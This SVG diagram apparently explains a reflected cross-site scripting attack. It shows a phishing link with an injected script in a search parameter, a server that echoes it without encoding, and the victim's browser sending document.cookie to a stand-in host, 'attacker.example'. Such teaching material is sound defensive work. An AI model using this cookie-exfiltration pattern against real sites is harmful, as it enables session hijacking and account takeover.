<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1040 540" width="1040" height="540" font-family="'Space Grotesk','Segoe UI',system-ui,sans-serif">
  <defs>
    <pattern id="grid" width="24" height="24" patternUnits="userSpaceOnUse"><path d="M24 0H0V24" fill="none" stroke="#21262d" stroke-width="1" opacity="0.5"/></pattern>
    <marker id="ar" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#8b949e"/></marker>
    <marker id="arRed" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#f85149"/></marker>
    <marker id="arAmber" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#d29922"/></marker>
  </defs>
  <rect x="0" y="0" width="1040" height="540" fill="#0d1117"/>
  <rect x="0" y="0" width="1040" height="540" fill="url(#grid)"/>
  <text x="22" y="34" font-size="13" font-family="'JetBrains Mono',monospace" fill="#00caff" letter-spacing="1">&gt;_</text>
  <text x="50" y="36" font-size="19" font-weight="700" fill="#e6edf3">Reflected XSS (Server-Side) - Attack Path</text>
  <line x1="892" y1="20" x2="916" y2="20" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ar)"/>
  <text x="922" y="24" font-size="11" fill="#8b949e">request</text>
  <line x1="892" y1="38" x2="916" y2="38" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#ar)"/>
  <text x="922" y="42" font-size="11" fill="#8b949e">response</text>
  <line x1="892" y1="56" x2="916" y2="56" stroke="#f85149" stroke-width="1.5" marker-end="url(#arRed)"/>
  <text x="922" y="60" font-size="11" fill="#ff6b6b">vulnerable step</text>
  <line x1="150" y1="110" x2="150" y2="464" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4 5"/>
  <line x1="480" y1="110" x2="480" y2="464" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4 5"/>
  <line x1="800" y1="110" x2="800" y2="464" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4 5"/>
  <rect x="75" y="64" width="150" height="46" rx="6" fill="#161b22" stroke="#00caff" stroke-width="1.5"/>
  <text x="150" y="87" text-anchor="middle" font-size="14" font-weight="700" fill="#5cd6f7">Attacker</text>
  <text x="150" y="101" text-anchor="middle" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">attacker.example</text>
  <rect x="405" y="64" width="150" height="46" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
  <text x="480" y="87" text-anchor="middle" font-size="14" font-weight="700" fill="#e6edf3">Victim</text>
  <text x="480" y="101" text-anchor="middle" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">logged-in user</text>
  <rect x="725" y="64" width="150" height="46" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
  <text x="800" y="87" text-anchor="middle" font-size="14" font-weight="700" fill="#e6edf3">Server</text>
  <text x="800" y="101" text-anchor="middle" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">shop.example</text>
  <text x="480" y="134" text-anchor="middle" font-size="9.5" font-style="italic" fill="#6e7681">logged in to shop.example, session cookie readable by JS</text>
  <text x="315" y="147" text-anchor="middle" font-size="11" fill="#e6edf3">1. Phishing link</text>
  <text x="315" y="159" text-anchor="middle" font-size="9.5" font-family="'JetBrains Mono',monospace" fill="#a0e9ff">shop.example/search?q=&lt;script&gt;...&lt;/script&gt;</text>
  <line x1="158" y1="166" x2="472" y2="166" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ar)"/>
  <text x="640" y="205" text-anchor="middle" font-size="11" fill="#e6edf3">2. GET /search?q=&lt;script&gt;...</text>
  <text x="640" y="217" text-anchor="middle" font-size="9.5" font-family="'JetBrains Mono',monospace" fill="#a0e9ff">Cookie: session=...</text>
  <line x1="488" y1="224" x2="792" y2="224" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ar)"/>
  <text x="640" y="275" text-anchor="middle" font-size="11" fill="#e6edf3">3. 200 OK: q reflected UNENCODED</text>
  <line x1="792" y1="282" x2="488" y2="282" stroke="#f85149" stroke-width="2" stroke-dasharray="5 3" marker-end="url(#arRed)"/>
  <text x="812" y="278" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">no output encoding</text>
  <rect x="340" y="332" width="280" height="38" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
  <text x="480" y="356" text-anchor="middle" font-size="10.5" font-weight="600" fill="#e6edf3">browser runs the injected &lt;script&gt;</text>
  <text x="315" y="383" text-anchor="middle" font-size="11" fill="#e6edf3">4. GET attacker.example/?c=...</text>
  <text x="315" y="395" text-anchor="middle" font-size="9.5" font-family="'JetBrains Mono',monospace" fill="#a0e9ff">c = document.cookie (session)</text>
  <line x1="472" y1="402" x2="158" y2="402" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ar)"/>
  <text x="22" y="490" font-size="12.5" fill="#6e7681">The site writes the request parameter into the HTML with no encoding, so the victim's browser runs the attacker's script and leaks the session cookie.</text>
  <text x="22" y="508" font-size="12.5" fill="#6e7681">The attacker replays the stolen session for <tspan fill="#4ade80" font-weight="700">account takeover</tspan>.</text>
</svg>
